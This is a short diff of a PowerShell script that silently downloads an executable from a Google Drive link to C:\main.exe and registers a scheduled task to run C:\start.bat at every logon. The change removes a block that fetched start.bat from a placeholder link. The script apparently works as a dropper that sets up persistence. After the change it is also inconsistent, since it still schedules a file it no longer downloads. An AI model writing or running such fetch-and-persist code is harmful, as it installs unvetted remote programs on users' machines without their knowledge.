@@ -19,10 +19,6 @@ $source = 'https://drive.google.com/u/8/uc?id=1sVWGSv0z0kxDindHruAM6P6alLBiz6ad&
 $ProgressPreference = 'SilentlyContinue'
 $destination = 'C:\main.exe'
 Invoke-RestMethod -Uri $source -OutFile $destination
-$source = 'LINKDOSTARTBAT'
-$ProgressPreference = 'SilentlyContinue'
-$destination = 'C:\start.bat'
-Invoke-RestMethod -Uri $source -OutFile $destination
 $ac = New-ScheduledTaskAction -Execute "C:\start.bat" 
 Invoke-RestMethod -Uri $source -OutFile $destination
 $tr = New-ScheduledTaskTrigger -AtLogOn 
